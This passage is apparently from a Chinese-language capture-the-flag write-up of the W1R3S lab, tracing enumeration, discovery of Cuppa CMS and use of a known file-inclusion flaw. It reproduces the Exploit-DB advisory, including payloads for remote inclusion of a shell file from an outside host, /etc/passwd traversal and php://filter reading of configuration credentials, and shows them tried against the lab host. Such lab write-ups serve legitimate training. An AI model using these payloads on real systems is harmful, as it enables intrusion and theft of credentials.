</span></span></code></pre></td></tr></table></div>
</div>
</div><p>大概意思就是说别瞎玩了，我们还有很多事要做。</p>
<p><code>FTP</code> 就到此为止了。</p>
<p>‍</p>
<h2 id=3306-mysql-渗透><a href=#3306-mysql-渗透 class=anchor-link><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96.0-59.27-59.26-59.27-155.7.0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757.0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037.0 01-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482.0 0120.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96.0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454.0 0020.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037.0 00-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639.0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a><a href=#contents:3306-mysql-渗透 class=headings>3306 mysql 渗透</a></h2>
<p>尝试连接 <code>3306</code>，因为是 <code>Ubuntu</code>，猜测用户名是 <code>root</code>，会有空密码的情况吗?</p>
<div class=highlight><div class=chroma>
<div class=table-container><table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ mysql -h 10.10.10.130 -u root -p
</span></span><span class=line><span class=cl>Enter password: 
</span></span><span class=line><span class=cl>ERROR <span class=m>1130</span> <span class=o>(</span>HY000<span class=o>)</span>: Host <span class=s1>&#39;10.10.10.128&#39;</span> is not allowed to connect to this MySQL server
</span></span></code></pre></td></tr></table></div>
</div>
</div><p>这里的提示信息是本机无法连接到 <code>MySQL server</code>。</p>
<p>也没有什么信息，<code>3306</code> 暂时放弃了。</p>
<p>‍</p>
<p>‍</p>
<h2 id=web-渗透><a href=#web-渗透 class=anchor-link><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96.0-59.27-59.26-59.27-155.7.0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757.0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037.0 01-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482.0 0120.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96.0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454.0 0020.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037.0 00-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639.0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a><a href=#contents:web-渗透 class=headings>Web 渗透</a></h2>
<p>首页是 Apache2 的默认界面。</p>
<p><img src=../../images/w1r3s-v1.1/image-20240328113531-33npd4k.webp alt=image></p>
<p>进入<code>/wordpress/wp-login.php</code> 发现了要账号登陆。</p>
<p><img src=../../images/w1r3s-v1.1/image-20240328113650-8lhy985.webp alt=image></p>
<p><img src=../../images/w1r3s-v1.1/image-20240328113917-k5vbmvw.webp alt=image></p>
<p>源代码也没什么发现，试试目录爆破吧。</p>
<div class=highlight><div class=chroma>
<div class=table-container><table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ sudo gobuster dir -u http://10.10.10.130 --wordlist<span class=o>=</span>/usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
</span></span><span class=line><span class=cl>Gobuster v3.6
</span></span><span class=line><span class=cl>by OJ Reeves <span class=o>(</span>@TheColonial<span class=o>)</span> <span class=p>&amp;</span> Christian Mehlmauer <span class=o>(</span>@firefart<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Url:                     http://10.10.10.130
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Method:                  GET
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Threads:                 <span class=m>10</span>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Wordlist:                /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Negative Status codes:   <span class=m>404</span>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> User Agent:              gobuster/3.6
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Timeout:                 <span class=nv>10s</span>
</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
</span></span><span class=line><span class=cl>Starting gobuster in directory enumeration <span class=nv>mode</span>
</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
</span></span><span class=line><span class=cl>/wordpress            <span class=o>(</span>Status: 301<span class=o>)</span> <span class=o>[</span>Size: 316<span class=o>]</span> <span class=o>[</span>--&gt; http://10.10.10.130/wordpress/<span class=o>]</span>
</span></span><span class=line><span class=cl>/javascript           <span class=o>(</span>Status: 301<span class=o>)</span> <span class=o>[</span>Size: 317<span class=o>]</span> <span class=o>[</span>--&gt; http://10.10.10.130/javascript/<span class=o>]</span>
</span></span><span class=line><span class=cl>/administrator        <span class=o>(</span>Status: 301<span class=o>)</span> <span class=o>[</span>Size: 320<span class=o>]</span> <span class=o>[</span>--&gt; http://10.10.10.130/administrator/<span class=o>]</span>
</span></span><span class=line><span class=cl>/server-status        <span class=o>(</span>Status: 403<span class=o>)</span> <span class=o>[</span>Size: 300<span class=o>]</span>
</span></span><span class=line><span class=cl>Progress: <span class=m>207643</span> / <span class=m>207644</span> <span class=o>(</span>100.00%<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
</span></span><span class=line><span class=cl><span class=nv>Finished</span>
</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
</span></span></code></pre></td></tr></table></div>
</div>
</div><p>根据以上内容，目前暴露出来的有 <code>wordpress</code>，还有个 <code>CMS</code>：</p>
<div class=highlight><div class=chroma>
<div class=table-container><table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># wordpress            </span>
</span></span><span class=line><span class=cl>http://10.10.10.130/wordpress/
</span></span><span class=line><span class=cl><span class=c1># cms</span>
</span></span><span class=line><span class=cl>http://10.10.10.130/administrator/
</span></span></code></pre></td></tr></table></div>
</div>
</div><p><code>administrator</code>很明显这是一套 <code>CMS</code> 的安装界面引导，尝试一下这里有没有突破口。</p>
<p><img src=../../images/w1r3s-v1.1/image-20240328115319-wzwn2ao.webp alt=image></p>
<p>这里暴露了这是一个 <code>Cuppa CMS</code> 默认账号密码都是：<code>admin</code>，随便填写一些信息看看可否下一步。</p>
<p><img src=../../images/w1r3s-v1.1/image-20240328115618-p723buw.webp alt=image></p>
<p>在用户创建时失败了，搜索一下 <code>Cuppa CMS</code> 有什么暴露出来的漏洞可以利用的。</p>
<div class=highlight><div class=chroma>
<div class=table-container><table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ searchsploit cuppa       
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>------------------------------------------------------------------------------------------------------------- ---------------------------------
</span></span><span class=line><span class=cl> Exploit Title                                                                                               <span class=p>|</span>  Path
</span></span><span class=line><span class=cl>------------------------------------------------------------------------------------------------------------- ---------------------------------
</span></span><span class=line><span class=cl>Cuppa CMS - <span class=s1>&#39;/alertConfigField.php&#39;</span> Local/Remote File Inclusion                                              <span class=p>|</span> php/webapps/25971.txt
</span></span><span class=line><span class=cl>------------------------------------------------------------------------------------------------------------- ---------------------------------
</span></span><span class=line><span class=cl>Shellcodes: No Results
</span></span></code></pre></td></tr></table></div>
</div>
</div><p>搜索结果出来了一个，<code>File Inclusion</code> 文件包含，查看一下具体位置信息。</p>
<div class=highlight><div class=chroma>
<div class=table-container><table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ searchsploit cuppa -m 25971.txt  
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>!<span class=o>]</span> Could not find EDB-ID <span class=c1>#</span>
</span></span><span class=line><span class=cl>  Exploit: Cuppa CMS - <span class=s1>&#39;/alertConfigField.php&#39;</span> Local/Remote File Inclusion
</span></span><span class=line><span class=cl>      URL: https://www.exploit-db.com/exploits/25971
</span></span><span class=line><span class=cl>     Path: /usr/share/exploitdb/exploits/php/webapps/25971.txt
</span></span><span class=line><span class=cl>    Codes: OSVDB-94101
</span></span><span class=line><span class=cl> Verified: True
</span></span><span class=line><span class=cl>File Type: C++ source, ASCII text, with very long lines <span class=o>(</span>876<span class=o>)</span>
</span></span><span class=line><span class=cl>Copied to: /home/kali/25971.txt
</span></span></code></pre></td></tr></table></div>
</div>
</div><div class=highlight><div class=chroma>
<div class=table-container><table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
</span><span class=lnt>63
</span><span class=lnt>64
</span><span class=lnt>65
</span><span class=lnt>66
</span><span class=lnt>67
</span><span class=lnt>68
</span><span class=lnt>69
</span><span class=lnt>70
</span><span class=lnt>71
</span><span class=lnt>72
</span><span class=lnt>73
</span><span class=lnt>74
</span><span class=lnt>75
</span><span class=lnt>76
</span><span class=lnt>77
</span><span class=lnt>78
</span><span class=lnt>79
</span><span class=lnt>80
</span><span class=lnt>81
</span><span class=lnt>82
</span><span class=lnt>83
</span><span class=lnt>84
</span><span class=lnt>85
</span><span class=lnt>86
</span><span class=lnt>87
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># Exploit Title   : Cuppa CMS File Inclusion</span>
</span></span><span class=line><span class=cl><span class=c1># Date            : 4 June 2013</span>
</span></span><span class=line><span class=cl><span class=c1># Exploit Author  : CWH Underground</span>
</span></span><span class=line><span class=cl><span class=c1># Site            : www.2600.in.th</span>
</span></span><span class=line><span class=cl><span class=c1># Vendor Homepage : http://www.cuppacms.com/</span>
</span></span><span class=line><span class=cl><span class=c1># Software Link   : http://jaist.dl.sourceforge.net/project/cuppacms/cuppa_cms.zip</span>
</span></span><span class=line><span class=cl><span class=c1># Version         : Beta</span>
</span></span><span class=line><span class=cl><span class=c1># Tested on       : Window and Linux</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  ,--^----------,--------,-----,-------^--,
</span></span><span class=line><span class=cl>  <span class=p>|</span> <span class=o>||||||||</span><span class=p>|</span>   <span class=sb>`</span>--------<span class=s1>&#39;     |          O .. CWH Underground Hacking Team ..
</span></span></span><span class=line><span class=cl><span class=s1>  `+---------------------------^----------|
</span></span></span><span class=line><span class=cl><span class=s1>    `\_,-------, _________________________|
</span></span></span><span class=line><span class=cl><span class=s1>      / XXXXXX /`|     /
</span></span></span><span class=line><span class=cl><span class=s1>     / XXXXXX /  `\   /
</span></span></span><span class=line><span class=cl><span class=s1>    / XXXXXX /\______(
</span></span></span><span class=line><span class=cl><span class=s1>   / XXXXXX /
</span></span></span><span class=line><span class=cl><span class=s1>  / XXXXXX /
</span></span></span><span class=line><span class=cl><span class=s1> (________(
</span></span></span><span class=line><span class=cl><span class=s1>  `------&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>####################################</span>
</span></span><span class=line><span class=cl>VULNERABILITY: PHP CODE INJECTION
</span></span><span class=line><span class=cl><span class=c1>####################################</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>/alerts/alertConfigField.php <span class=o>(</span>LINE: 22<span class=o>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>-----------------------------------------------------------------------------
</span></span><span class=line><span class=cl>LINE 22:
</span></span><span class=line><span class=cl>        &lt;?php include<span class=o>(</span><span class=nv>$_REQUEST</span><span class=o>[</span><span class=s2>&#34;urlConfig&#34;</span><span class=o>])</span><span class=p>;</span> ?&gt;
</span></span><span class=line><span class=cl>-----------------------------------------------------------------------------
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>#####################################################</span>
</span></span><span class=line><span class=cl>DESCRIPTION
</span></span><span class=line><span class=cl><span class=c1>#####################################################</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>An attacker might include <span class=nb>local</span> or remote PHP files or <span class=nb>read</span> non-PHP files with this vulnerability. User tainted data is used when creating the file name that will be included into the current file. PHP code in this file will be evaluated, non-PHP code will be embedded to the output. This vulnerability can lead to full server compromise.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>http://target/cuppa/alerts/alertConfigField.php?urlConfig<span class=o>=[</span>FI<span class=o>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>#####################################################</span>
</span></span><span class=line><span class=cl>EXPLOIT
</span></span><span class=line><span class=cl><span class=c1>#####################################################</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>http://target/cuppa/alerts/alertConfigField.php?urlConfig<span class=o>=</span>http://www.shell.com/shell.txt?
</span></span><span class=line><span class=cl>http://target/cuppa/alerts/alertConfigField.php?urlConfig<span class=o>=</span>../../../../../../../../../etc/passwd
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Moreover, We could access Configuration.php <span class=nb>source</span> code via PHPStream
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>For Example:
</span></span><span class=line><span class=cl>-----------------------------------------------------------------------------
</span></span><span class=line><span class=cl>http://target/cuppa/alerts/alertConfigField.php?urlConfig<span class=o>=</span>php://filter/convert.base64-encode/resource<span class=o>=</span>../Configuration.php
</span></span><span class=line><span class=cl>-----------------------------------------------------------------------------
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Base64 Encode Output:
</span></span><span class=line><span class=cl>-----------------------------------------------------------------------------
</span></span><span class=line><span class=cl>PD9waHAgCgljbGFzcyBDb25maWd1cmF0aW9uewoJCXB1YmxpYyAkaG9zdCA9ICJsb2NhbGhvc3QiOwoJCXB1YmxpYyAkZGIgPSAiY3VwcGEiOwoJCXB1YmxpYyAkdXNlciA9ICJyb290IjsKCQlwdWJsaWMgJHBhc3N3b3JkID0gIkRiQGRtaW4iOwoJCXB1YmxpYyAkdGFibGVfcHJlZml4ID0gImN1XyI7CgkJcHVibGljICRhZG1pbmlzdHJhdG9yX3RlbXBsYXRlID0gImRlZmF1bHQiOwoJCXB1YmxpYyAkbGlzdF9saW1pdCA9IDI1OwoJCXB1YmxpYyAkdG9rZW4gPSAiT0JxSVBxbEZXZjNYIjsKCQlwdWJsaWMgJGFsbG93ZWRfZXh0ZW5zaW9ucyA9ICIqLmJtcDsgKi5jc3Y7ICouZG9jOyAqLmdpZjsgKi5pY287ICouanBnOyAqLmpwZWc7ICoub2RnOyAqLm9kcDsgKi5vZHM7ICoub2R0OyAqLnBkZjsgKi5wbmc7ICoucHB0OyAqLnN3ZjsgKi50eHQ7ICoueGNmOyAqLnhsczsgKi5kb2N4OyAqLnhsc3giOwoJCXB1YmxpYyAkdXBsb2FkX2RlZmF1bHRfcGF0aCA9ICJtZWRpYS91cGxvYWRzRmlsZXMiOwoJCXB1YmxpYyAkbWF4aW11bV9maWxlX3NpemUgPSAiNTI0Mjg4MCI7CgkJcHVibGljICRzZWN1cmVfbG9naW4gPSAwOwoJCXB1YmxpYyAkc2VjdXJlX2xvZ2luX3ZhbHVlID0gIiI7CgkJcHVibGljICRzZWN1cmVfbG9naW5fcmVkaXJlY3QgPSAiIjsKCX0gCj8+
</span></span><span class=line><span class=cl>-----------------------------------------------------------------------------
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Base64 Decode Output:
</span></span><span class=line><span class=cl>-----------------------------------------------------------------------------
</span></span><span class=line><span class=cl>&lt;?php
</span></span><span class=line><span class=cl>	class Configuration<span class=o>{</span>
</span></span><span class=line><span class=cl>		public <span class=nv>$host</span> <span class=o>=</span> <span class=s2>&#34;localhost&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>		public <span class=nv>$db</span> <span class=o>=</span> <span class=s2>&#34;cuppa&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>		public <span class=nv>$user</span> <span class=o>=</span> <span class=s2>&#34;root&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>		public <span class=nv>$password</span> <span class=o>=</span> <span class=s2>&#34;Db@dmin&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>		public <span class=nv>$table_prefix</span> <span class=o>=</span> <span class=s2>&#34;cu_&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>		public <span class=nv>$administrator_template</span> <span class=o>=</span> <span class=s2>&#34;default&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>		public <span class=nv>$list_limit</span> <span class=o>=</span> 25<span class=p>;</span>
</span></span><span class=line><span class=cl>		public <span class=nv>$token</span> <span class=o>=</span> <span class=s2>&#34;OBqIPqlFWf3X&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>		public <span class=nv>$allowed_extensions</span> <span class=o>=</span> <span class=s2>&#34;*.bmp; *.csv; *.doc; *.gif; *.ico; *.jpg; *.jpeg; *.odg; *.odp; *.ods; *.odt; *.pdf; *.png; *.ppt; *.swf; *.txt; *.xcf; *.xls; *.docx; *.xlsx&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>		public <span class=nv>$upload_default_path</span> <span class=o>=</span> <span class=s2>&#34;media/uploadsFiles&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>		public <span class=nv>$maximum_file_size</span> <span class=o>=</span> <span class=s2>&#34;5242880&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>		public <span class=nv>$secure_login</span> <span class=o>=</span> 0<span class=p>;</span>
</span></span><span class=line><span class=cl>		public <span class=nv>$secure_login_value</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>		public <span class=nv>$secure_login_redirect</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=o>}</span>
</span></span><span class=line><span class=cl>?&gt;
</span></span><span class=line><span class=cl>-----------------------------------------------------------------------------
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Able to <span class=nb>read</span> sensitive information via File Inclusion <span class=o>(</span>PHP Stream<span class=o>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>################################################################################################################</span>
</span></span><span class=line><span class=cl> Greetz      : ZeQ3uL, JabAv0C, p3lo, Sh0ck, BAD <span class=nv>$ectors</span>, Snapter, Conan, Win7dos, Gdiupo, GnuKDE, JK, Retool2
</span></span><span class=line><span class=cl><span class=c1>################################################################################################################</span>
</span></span></code></pre></td></tr></table></div>
</div>
</div><p>从文件中可以找到：</p>
<p>源代码位置在：http://jaist.dl.sourceforge.net/project/cuppacms/cuppa_cms.zip</p>
<p>出现文件包含的位置在 <code>/alerts/alertConfigField.php</code> 的第二十二行：</p>
<div class=highlight><div class=chroma>
<div class=table-container><table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>&lt;?php include<span class=o>(</span><span class=nv>$_REQUEST</span><span class=o>[</span><span class=s2>&#34;urlConfig&#34;</span><span class=o>])</span><span class=p>;</span> ?&gt;
</span></span></code></pre></td></tr></table></div>
</div>
</div><p><code>EXPLOIT</code> 利用方法：</p>
<div class=highlight><div class=chroma>
<div class=table-container><table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>http://target/cuppa/alerts/alertConfigField.php?urlConfig<span class=o>=</span>http://www.shell.com/shell.txt?
</span></span><span class=line><span class=cl>http://target/cuppa/alerts/alertConfigField.php?urlConfig<span class=o>=</span>../../../../../../../../../etc/passwd
</span></span><span class=line><span class=cl>http://target/cuppa/alerts/alertConfigField.php?urlConfig<span class=o>=</span>php://filter/convert.base64-encode/resource<span class=o>=</span>../Configuration.php
</span></span></code></pre></td></tr></table></div>
</div>
</div><p>通过拼接 <code>URL</code> 找到了，尝试一下：</p>
<div class=highlight><div class=chroma>
<div class=table-container><table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>http://10.10.10.130/administrator/alerts/alertConfigField.php
</span></span></code></pre></td></tr></table></div>
</div>
</div><p><img src=../../images/w1r3s-v1.1/image-20240328120838-ezs7kv9.webp alt=image></p>
<p>拼接一下参数试试：</p>
<div class=highlight><div class=chroma>
<div class=table-container><table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>http://10.10.10.130/administrator/alerts/alertConfigField.php
</span></span><span class=line><span class=cl>?urlConfig<span class=o>=</span>../../../../../../../../../etc/passwd
</span></span><span class=line><span class=cl>?urlConfig<span class=o>=</span>php://filter/convert.base64-encode/resource<span class=o>=</span>../Configuration.php
</span></span></code></pre></td></tr></table></div>
</div>
</div><p>结果和上面一样，但是没有回显。</p>
<p>‍</p>
<p>奇怪，按道理来说被修复了的话是不会出现这个窗口的，可是没有修复的情况下又没有回显，代码审计看看吧。</p>
<div class=highlight><div class=chroma>
<div class=table-container><table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># 下载 cuppa_cms.zip 源码包</span>
</span></span><span class=line><span class=cl>$ wget http://jaist.dl.sourceforge.net/project/cuppacms/cuppa_cms.zip
</span></span></code></pre></td></tr></table></div>
</div>
</div><p>使用 <code>vim</code> 检查 <code>alerts/alertConfigField.php</code> 文件</p>
<div class=highlight><div class=chroma>
<div class=table-container><table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ vim alerts/alertConfigField.php 
</span></span></code></pre></td></tr></table></div>
</div>
</div><p><img src=../../images/w1r3s-v1.1/image-20240328214317-z8znh5n.webp alt=image></p>
<div class=highlight><div class=chroma>
<div class=table-container><table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span><span class=lnt>9
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>div</span> <span class=na>class</span><span class=o>=</span><span class=s>&#34;alert_config_field&#34;</span> <span class=na>id</span><span class=o>=</span><span class=s>&#34;alert&#34;</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>    <span class=p>&lt;</span><span class=nt>div</span> <span class=na>class</span><span class=o>=</span><span class=s>&#34;alert_config_top&#34;</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>        <span class=p>&lt;</span><span class=nt>strong</span><span class=p>&gt;</span><span class=cp>&lt;?php echo $language-&gt;fields_configuration ?&gt;</span><span class=p>&lt;/</span><span class=nt>strong</span><span class=p>&gt;</span>: <span class=cp>&lt;?php echo @$cuppa-&gt;POST(&#34;field&#34;); ?&gt;</span>
</span></span><span class=line><span class=cl>        <span class=p>&lt;</span><span class=nt>div</span> <span class=na>class</span><span class=o>=</span><span class=s>&#34;btnClose_alert&#34;</span> <span class=na>id</span><span class=o>=</span><span class=s>&#34;btnClose_alert&#34;</span> <span class=na>onclick</span><span class=o>=</span><span class=s>&#34;CloseDefaultAlert()&#34;</span><span class=p>&gt;&lt;/</span><span class=nt>div</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>    <span class=p>&lt;/</span><span class=nt>div</span><span class=p>&gt;</span>
